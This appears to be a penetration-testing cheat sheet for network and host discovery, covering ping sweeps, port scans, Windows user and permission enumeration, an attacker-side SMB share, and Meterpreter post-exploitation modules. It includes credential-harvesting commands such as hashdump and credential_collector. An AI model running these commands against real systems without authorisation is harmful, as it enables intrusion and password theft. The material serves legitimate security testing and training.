# Discovery

- [Discovery](#discovery)
  - [Linux](#linux)
    - [Network](#network)
  - [Windows](#windows)
    - [Network](#network-1)
    - [Local Recon](#local-recon)
      - [Enumerate users](#enumerate-users)
      - [Get directory/file perms](#get-directoryfile-perms)
      - [Get services permissions](#get-services-permissions)
      - [Connect into SMB server](#connect-into-smb-server)
      - [Using Meterpreter](#using-meterpreter)

## Linux

### Network

Enumerate all responding @IP of the network. Bash native.

```bash
# enumerate @IP
for i in {1..255}; do (ping -c 1 172.16.2.${i} | grep "bytes from" &); done

# enumerate open port for 1 @IP
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

## Windows

### Network

Get all responding Ip addresses using Windows native command:

```ps1
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
.\nc.exe -z -v 172.16.1.5 1-8000 # port using netcat
```

DNS / ARP / Routing Table / WiFi

```ps1
ipconfig /displaydns #DNS cache (Windows)
arp -a # ARP cache
netstat -na # Established TCP connections
netstat -nr # Routing table
netsh wlan show networks mode=b # Displays nearby wifi
nmcli dev show
```

**Path to the Windows hosts file**: `C:\Windows\System32\drivers\etc\hosts`

### Local Recon

#### Enumerate users

```bash
net users
net user <USERNAME>
```

#### Get directory/file perms

```bash
# using powershell
(Get-acl '<PATH>').access | ft IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -auto
```

#### Get services permissions

Download and upload the sysinternals tool: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

```bash
.\accesschk64.exe /accepteula -ucqv <SERVICE_NAME>
```

> **Get-ServiceAcl.ps1:** https://gist.github.com/cube0x0/1cdef7a90473443f72f28df085241175

#### Connect into SMB server

```bash
# attacker
└─$ impacket-smbserver s . -smb2support -username toto -password coucou

# victim
net use X: "\\servername\share" /user:morgan password
```

#### Using Meterpreter

- **arp_scanner** : The arp_scanner post module will perform an ARP scan for a given range through a compromised host.

`run post/windows/gather/arp_scanner`

- **credential_collector** : The credential_collector module harvests passwords hashes and tokens on the compromised host.

`run post/windows/gather/credentials/credential_collector`

- **dumplinks** : The dumplinks module parses the .lnk files in a users Recent Documents which could be useful for further information gathering. Note that, as shown below, we first need to migrate into a user process prior to running the module.

`run post/windows/manage/migrate (optionnal migrate to a user PID)`
`run post/windows/gather/dumplinks`

- **enum_applications** : The enum_applications module enumerates the applications that are installed on the compromised host.

`run post/windows/gather/enum_applications` 

- **enum_logged_on_users** : The enum_logged_on_users post module returns a listing of current and recently logged on users along with their SIDs.

- **enum_shares** : The enum_shares post module returns a listing of both configured and recently used shares on the compromised system.

`run post/windows/gather/enum_shares`

- **enum_snmp** : The enum_snmp module will enumerate the SNMP service configuration on the target, if present, including the community strings.

`run post/windows/gather/enum_snmp`

- **hashdump** : The hashdump post module will dump the local users accounts on the compromised host using the registry.

`run post/windows/gather/hashdump`

- **local_exploit_suggester** : The local_exploit_suggester, or 'Lester' for short, scans a system for local vulnerabilities contained in Metasploit. It then makes suggestions based on the results as well as displays exploit's location for quicker access.

`use post/multi/recon/local_exploit_suggester`